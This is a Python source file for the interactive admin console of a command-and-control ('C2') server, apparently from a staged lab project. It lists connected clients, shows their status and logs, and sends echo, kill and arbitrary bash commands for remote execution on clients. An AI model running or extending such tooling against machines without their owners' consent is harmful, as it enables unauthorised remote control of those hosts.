"""
CLI Interface for C2 Server Administration
Provides interactive command-line interface for managing clients and sending commands
"""

import asyncio
import sys
from typing import Optional
from server.c2_server import C2Server
from server.database import DatabaseInterface
import config


class C2CLI:
    """Command-line interface for C2 Server administration"""

    def __init__(self, server: C2Server, database: Optional[DatabaseInterface] = None):
        """
        Initialize CLI

        Args:
            server: C2Server instance to control
            database: Database interface for querying logs
        """
        self.server = server
        self.database = database
        self.running = True
        self.prompt = "C2> "

    def reprint_prompt(self) -> None:
        """Reprint the prompt after async output"""
        # Move to new line and reprint prompt
        print(f"\r{self.prompt}", end='', flush=True)

    def print_help(self) -> None:
        """Print available commands"""
        help_text = """
C2 Server Admin Commands:
--------------------------
  list                    - List all connected clients
  status <client_id>      - Show detailed status for a client
  echo <client_id> <msg>  - Send echo command to client
  kill <client_id>        - Terminate a client connection
  bash <client_id> <cmd>  - Execute bash command on client (Step 4)
  db events [limit]       - Show recent events from database (default: 10)
  db commands [limit]     - Show recent commands from database
  db results [limit]      - Show recent command results from database
  help                    - Show this help message
  exit                    - Shutdown server and exit

Examples:
  list
  echo abc-123 "Hello World"
  bash abc-123 ls -la
  db events 5
  db commands
  kill abc-123
"""
        print(help_text)

    async def handle_list_command(self) -> None:
        """Handle 'list' command - show all connected clients"""
        clients = self.server.list_clients()

        if not clients:
            print("No clients connected.")
            return

        print(f"\nConnected Clients ({len(clients)}):")
        print("-" * config.CLI_TABLE_WIDTH_STANDARD)
        print(f"{'Client ID':<{config.CLI_CLIENT_ID_WIDTH}} {'Address':<{config.CLI_ADDRESS_WIDTH}} {'Status':<{config.CLI_STATUS_WIDTH}}")
        print("-" * config.CLI_TABLE_WIDTH_STANDARD)

        for client in clients:
            status = "Alive" if client["is_alive"] else "Dead"
            print(f"{client['client_id']:<{config.CLI_CLIENT_ID_WIDTH}} {client['address']:<{config.CLI_ADDRESS_WIDTH}} {status:<{config.CLI_STATUS_WIDTH}}")

        print()

    async def handle_status_command(self, args: list) -> None:
        """Handle 'status' command - show detailed client status"""
        if len(args) < 1:
            print("Error: client_id required. Usage: status <client_id>")
            return

        client_id = args[0]
        clients = self.server.list_clients()
        client = next((c for c in clients if c["client_id"] == client_id), None)

        if not client:
            print(f"Error: Client {client_id} not found.")
            return

        print(f"\nClient Status:")
        print("-" * config.CLI_TABLE_WIDTH_NARROW)
        print(f"Client ID:      {client['client_id']}")
        print(f"Address:        {client['address']}")
        print(f"Connected At:   {client['connected_at']}")
        print(f"Last Heartbeat: {client['last_heartbeat']}")
        print(f"Is Alive:       {client['is_alive']}")
        print()

    async def handle_echo_command(self, args: list) -> None:
        """Handle 'echo' command - send echo command to client"""
        if len(args) < 2:
            print("Error: Usage: echo <client_id> <message>")
            return

        client_id = args[0]
        message = " ".join(args[1:])

        success = await self.server.send_command(
            client_id,
            message,
            command_type="echo"
        )

        if success:
            print(f"Echo command sent to {client_id}. Waiting for response...")
        else:
            print(f"Failed to send command to {client_id}")

    async def handle_kill_command(self, args: list) -> None:
        """Handle 'kill' command - terminate client connection"""
        if len(args) < 1:
            print("Error: Usage: kill <client_id>")
            return

        client_id = args[0]

        success = await self.server.send_command(
            client_id,
            "",
            command_type="kill"
        )

        if success:
            print(f"Kill command sent to {client_id}")
        else:
            print(f"Failed to send kill command to {client_id}")

    async def handle_bash_command(self, args: list) -> None:
        """Handle 'bash' command - execute shell command on client (Step 4)"""
        if len(args) < 2:
            print("Error: Usage: bash <client_id> <command>")
            return

        client_id = args[0]
        command = " ".join(args[1:])

        success = await self.server.send_command(
            client_id,
            command,
            command_type="bash"
        )

        if success:
            print(f"Bash command sent to {client_id}. Waiting for response...")
        else:
            print(f"Failed to send command to {client_id}")

    async def handle_db_command(self, args: list) -> None:
        """Handle 'db' command - query database logs"""
        if not self.database:
            print("Error: Database not configured")
            return

        if len(args) < 1:
            print("Error: Usage: db <events|commands|results> [limit]")
            return

        table = args[0].lower()
        limit = int(args[1]) if len(args) > 1 else config.CLI_DEFAULT_DB_LIMIT

        if table not in ["events", "commands", "results"]:
            print(f"Error: Unknown table '{table}'. Use: events, commands, or results")
            return

        try:
            if table == "events":
                events = await self.database.get_recent_events(limit)
                print(f"\nRecent Events (Last {limit}):")
                print("-" * config.CLI_TABLE_WIDTH_WIDE)
                print(f"{'Timestamp':<{config.CLI_TIMESTAMP_WIDTH}} {'Event Type':<{config.CLI_EVENT_TYPE_WIDTH}} {'Client ID':<{config.CLI_CLIENT_ID_WIDTH}} {'Details':<{config.CLI_DETAILS_WIDTH}}")
                print("-" * config.CLI_TABLE_WIDTH_WIDE)
                for event in events:
                    details = event['details'] or ""
                    details = (details[:17] + "...") if len(details) > config.CLI_DETAILS_WIDTH else details
                    print(f"{str(event['timestamp']):<{config.CLI_TIMESTAMP_WIDTH}} {event['event_type']:<{config.CLI_EVENT_TYPE_WIDTH}} {event['client_id']:<{config.CLI_CLIENT_ID_WIDTH}} {details:<{config.CLI_DETAILS_WIDTH}}")

            elif table == "commands":
                commands = await self.database.get_recent_commands(limit)
                print(f"\nRecent Commands (Last {limit}):")
                print("-" * config.CLI_TABLE_WIDTH_WIDE)
                print(f"{'Timestamp':<{config.CLI_TIMESTAMP_WIDTH}} {'Client ID':<{config.CLI_CLIENT_ID_WIDTH}} {'Type':<{config.CLI_COMMAND_TYPE_WIDTH}} {'Command':<{config.CLI_COMMAND_WIDTH}}")
                print("-" * config.CLI_TABLE_WIDTH_WIDE)
                for cmd in commands:
                    command = cmd['command']
                    command = (command[:27] + "...") if len(command) > config.CLI_COMMAND_WIDTH else command
                    print(f"{str(cmd['timestamp']):<{config.CLI_TIMESTAMP_WIDTH}} {cmd['client_id']:<{config.CLI_CLIENT_ID_WIDTH}} {cmd['command_type']:<{config.CLI_COMMAND_TYPE_WIDTH}} {command:<{config.CLI_COMMAND_WIDTH}}")

            elif table == "results":
                results = await self.database.get_recent_results(limit)
                print(f"\nRecent Results (Last {limit}):")
                print("-" * config.CLI_TABLE_WIDTH_WIDE)
                print(f"{'Timestamp':<{config.CLI_TIMESTAMP_WIDTH}} {'Client ID':<{config.CLI_CLIENT_ID_WIDTH}} {'Success':<{config.CLI_SUCCESS_WIDTH}} {'Result':<{config.CLI_RESULT_WIDTH}}")
                print("-" * config.CLI_TABLE_WIDTH_WIDE)
                for res in results:
                    result = res['result'] or ""
                    result = (result[:27] + "...") if len(result) > config.CLI_RESULT_WIDTH else result
                    print(f"{str(res['timestamp']):<{config.CLI_TIMESTAMP_WIDTH}} {res['client_id']:<{config.CLI_CLIENT_ID_WIDTH}} {str(res['success']):<{config.CLI_SUCCESS_WIDTH}} {result:<{config.CLI_RESULT_WIDTH}}")

            print()

        except Exception as e:
            print(f"Error querying database: {e}")

    async def handle_command(self, command_line: str) -> None:
        """
        Parse and handle a CLI command

        Args:
            command_line: Raw command line input
        """
        command_line = command_line.strip()

        if not command_line:
            return

        parts = command_line.split()
        command = parts[0].lower()
        args = parts[1:]

        # Use structural pattern matching (Python 3.10+)
        match command:
            case "help":
                self.print_help()
            case "list":
                await self.handle_list_command()
            case "status":
                await self.handle_status_command(args)
            case "echo":
                await self.handle_echo_command(args)
            case "kill":
                await self.handle_kill_command(args)
            case "bash":
                await self.handle_bash_command(args)
            case "db":
                await self.handle_db_command(args)
            case "exit":
                print("Shutting down server...")
                self.running = False
            case _:
                print(f"Unknown command: {command}. Type 'help' for available commands.")

    async def run(self) -> None:
        """
        Run the CLI loop

        Uses asyncio to handle input without blocking the server
        """
        # Register CLI with server for prompt refresh
        self.server.cli = self

        print("C2 Server CLI - Type 'help' for commands")

        # Run input loop in executor to avoid blocking
        # Citation: Asyncio loop.run_in_executor for blocking I/O
        # https://docs.python.org/3/library/asyncio-eventloop.html#asyncio.loop.run_in_executor
        loop = asyncio.get_event_loop()

        while self.running:
            try:
                # Read input without blocking event loop
                command_line = await loop.run_in_executor(
                    None,
                    lambda: input(self.prompt)
                )

                await self.handle_command(command_line)

            except EOFError:
                print("\nEOF received. Exiting...")
                self.running = False
            except KeyboardInterrupt:
                print("\nInterrupt received. Type 'exit' to quit.")
            except Exception as e:
                print(f"Error: {e}")

        # Stop the server
        await self.server.stop()
